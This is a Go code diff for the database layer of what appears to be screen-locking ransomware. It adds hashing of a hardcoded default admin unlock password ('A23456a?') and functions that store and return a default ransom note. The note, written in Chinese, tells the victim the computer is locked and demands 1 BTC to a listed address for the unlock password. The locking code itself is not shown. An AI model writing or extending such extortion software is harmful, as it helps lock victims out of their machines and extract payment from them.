@@ -1,7 +1,9 @@
 package main
 
 import (
+	"crypto/sha256"
 	"database/sql"
+	"encoding/hex"
 	"log"
 	"time"
 
@@ -9,6 +11,11 @@ import (
 )
 
 var db *sql.DB
+
+func calculateHash(text string) string {
+	hash := sha256.Sum256([]byte(text))
+	return hex.EncodeToString(hash[:])
+}
 
 func initDB() {
 	var err error
@@ -69,14 +76,52 @@ func initDB() {
 	}
 
 	// Set default password if not exists
-	setPasswordIfMissing("admin")
+	migratePassword()
 }
 
-func setPasswordIfMissing(defaultPwd string) {
+func migratePassword() {
 	var val string
 	err := db.QueryRow("SELECT value FROM config WHERE key = 'admin_password'").Scan(&val)
 	if err == sql.ErrNoRows {
-		setPassword(defaultPwd)
+		// Not exists, set default
+		setPassword("A23456a?")
+	} else if err == nil {
+		// Check if it's a hash (len 64)
+		if len(val) != 64 {
+			// It's likely plaintext, migrate it
+			log.Println("Migrating admin password to hash...")
+			setPassword(val)
+		} else {
+			// Check if it is the old default "admin" hash, if so, upgrade to new default
+			// admin hash: 8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
+			if val == "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918" {
+				log.Println("Upgrading default admin password...")
+				setPassword("A23456a?")
+			}
+		}
+	}
+
+	// Set default ransom note if not exists
+	var note string
+	err = db.QueryRow("SELECT value FROM config WHERE key = 'ransom_note'").Scan(&note)
+	if err == sql.ErrNoRows {
+		setRansomNote("您的电脑已被锁定！\n请支付 1 BTC 到以下地址以解锁：\n1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n\n(联系管理员获取密码)")
+	}
+}
+
+func getRansomNote() string {
+	var val string
+	err := db.QueryRow("SELECT value FROM config WHERE key = 'ransom_note'").Scan(&val)
+	if err != nil {
+		return "您的电脑已被锁定！\n请支付 1 BTC 到以下地址以解锁：\n1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n\n(联系管理员获取密码)"
+	}
+	return val
+}
+
+func setRansomNote(note string) {
+	_, err := db.Exec("INSERT OR REPLACE INTO config (key, value) VALUES ('ransom_note', ?)", note)
+	if err != nil {
+		log.Println("Error setting ransom note:", err)
 	}
 }
 
@@ -86,11 +131,23 @@ func checkPassword(inputPwd string) bool {
 	if err != nil {
 		return false
 	}
-	return inputPwd == storedPwd
+	// Calculate hash of input
+	inputHash := calculateHash(inputPwd)
+	return inputHash == storedPwd
+}
+
+func getAdminPassword() string {
+	var val string
+	err := db.QueryRow("SELECT value FROM config WHERE key = 'admin_password'").Scan(&val)
+	if err != nil {
+		return calculateHash("A23456a?") // Default fallback hash
+	}
+	return val
 }
 
 func setPassword(newPwd string) error {
-	_, err := db.Exec("INSERT OR REPLACE INTO config (key, value) VALUES ('admin_password', ?)", newPwd)
+	pwdHash := calculateHash(newPwd)
+	_, err := db.Exec("INSERT OR REPLACE INTO config (key, value) VALUES ('admin_password', ?)", pwdHash)
 	return err
 }
 
